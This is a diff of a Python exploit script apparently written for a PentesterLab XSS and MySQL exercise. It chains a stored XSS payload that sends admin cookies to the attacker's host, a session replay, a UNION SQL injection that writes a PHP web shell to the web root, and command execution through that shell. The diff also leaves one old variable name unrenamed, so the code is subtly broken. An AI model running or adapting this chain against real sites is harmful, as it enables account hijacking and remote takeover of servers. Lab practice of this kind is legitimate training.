@@ -6,11 +6,11 @@ import threading
 import time
 import  requests
 
+#exercice: https://pentesterlab.com/exercises/xss_and_mysql_file/course
 
-
-IP_victim="172.16.113.150"
-IP_Attack="172.16.113.148"
-Port=9090
+ip_victim="172.16.113.150"
+ip_attacker="172.16.113.148"
+port=9090
 
 
 ''' 
@@ -18,7 +18,7 @@ xss.js
 
 function xss(){
         var  img = document.createElement('img');
-        img.src = 'http://IP_Attack:Port/?'+document.cookie;
+        img.src = 'http://ip_attacker:port/?'+document.cookie;
         document.body.appendChild(img)
 }
 
@@ -30,20 +30,20 @@ xss();
 
 def xss_attack():
 	uri="http://"+IP_victim +"/post_comment.php?id=2"
-	vector="<script src=\""+"http://"+IP_Attack+":"+str(Port)+"/xss.js\"></script>"
-	payload={'title':'Confuse', 'author':'nyanyi','text':vector,'submit':'submit'}
+	vector="<script src=\""+"http://"+ip_attacker+":"+str(port)+"/xss.js\"></script>"
+	payload={'title':'test', 'author':'test','text':vector,'submit':'submit'}
 	r=requests.post(uri, data=payload)
 	print("Sending xss..")
 	
 def get_admin(cookie_value):
-	uri_admin="http://"+IP_victim+"/admin/"
+	uri_admin="http://"+ip_victim+"/admin/"
 	cookie_admin={'Cookie': cookie_value}
 	r = requests.get(uri_admin, headers=cookie_admin)
 
 	
 
 def remote_shell(cookie_value):
-	uri_sqli="http://"+IP_victim+"/admin/edit.php"
+	uri_sqli="http://"+ip_victim+"/admin/edit.php"
 	payload={'id':'2 union select 1,2, "<?php system($_GET[\'c\']); ?>",3 into outfile "/var/www/css/shell.php"'}
 	cookie_admin={'Cookie':cookie_value}
 	r=requests.get(uri_sqli, params=payload, headers=cookie_admin)
@@ -51,7 +51,7 @@ def remote_shell(cookie_value):
 	
 
 def command_test():
-	uri="http://"+IP_victim+"/css/shell.php"
+	uri="http://"+ip_victim+"/css/shell.php"
 	payload={'c':'uname;id;date'}
 	r=requests.get(uri, params=payload)
 	print(r.text)
@@ -59,7 +59,6 @@ def command_test():
 
 class Handler(SimpleHTTPRequestHandler):
 	def do_GET(self):
-		global control
 		parsed_path = parse.urlparse(self.path)
 		message_parts = [
             	'CLIENT VALUES:',
@@ -95,7 +94,7 @@ class Handler(SimpleHTTPRequestHandler):
 
 #main
 
-server= TCPServer(("", Port), Handler)
+server= TCPServer(("", port), Handler)
 print("Server Up")
 thread=threading.Thread(target=server.serve_forever)
 thread.start()
